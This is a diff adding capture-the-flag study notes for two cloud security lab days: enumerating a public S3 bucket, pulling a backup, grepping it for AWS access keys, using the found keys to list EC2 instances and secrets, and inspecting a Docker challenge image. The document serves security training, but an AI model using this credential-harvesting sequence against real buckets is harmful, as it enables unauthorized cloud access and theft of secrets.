@@ -405,3 +405,78 @@ McSkidy is back, yeah!
    * https://www.sans.org/posters/google-hacking-and-defense-cheat-sheet/
 * OSINT Challenge
    * Use Google to search for keywords in the ransomware message.  Track the user through various social media to answer the questions.
+
+# Task 22 - Day 17 - Cloud / Elf Leaks
+* AWS
+   * cloud service provider
+   * many regions
+   * many services
+* Gathering info on images.bestfestivalcompany.com
+* Challenge
+   * List files from bf
+      ```
+      aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
+      ```
+   * Grab flag from bf
+      ```
+      curl http://images.bestfestivalcompany.com.s3.amazonaws.com/flag.txt
+      ```
+   * Grab backup file from bf and unzip
+      ```
+      aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
+      unzip wp-backup.zip
+      ```
+   * Search backup files for access keys, list contents
+      ```
+      cat * | grep -R AKIA
+      cat wp-config.php | grep define
+      ```
+   * Create an AWS profile with the creds you found
+      ```
+      aws configure --profile bf
+      ```
+   * Grab account ID
+      ```
+      aws sts get-caller-identity --profile bf
+      ```
+   * List EC2 instances
+      ```
+      aws ec2 describe-instances --output table --profile bf      
+      ```
+   * List secrets
+      ```
+      aws secretsmanager list-secrets --profile bf
+      ```
+
+# Task 23 - Day 18 - Cloud / Playing with Containers
+* Containers are a virtualization mechanism similar to virtual machines
+* Docker is a container platform
+* Docker terms
+   * Docker API - local comm interface
+   * Docker Daemon - process that runs on your machine
+   * Docker Container Image Format - a tar file, image format and specifications
+* Challenge
+   * List local docker images
+      ```
+      docker images
+      ```
+   * Grab the challenge image and list it
+      ```
+      docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+      docker images
+      ```
+   * Run the challenge image
+      ```
+      docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+      printenv
+      exit
+      ```
+   * Create a temporary folder, download and investigate the challenge image
+      ```
+      mkdir aoc
+      cd aoc/
+      docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+      tar -xf aoc.tar
+      apt install jq -y
+      cat manifest.json | jq
+      ```
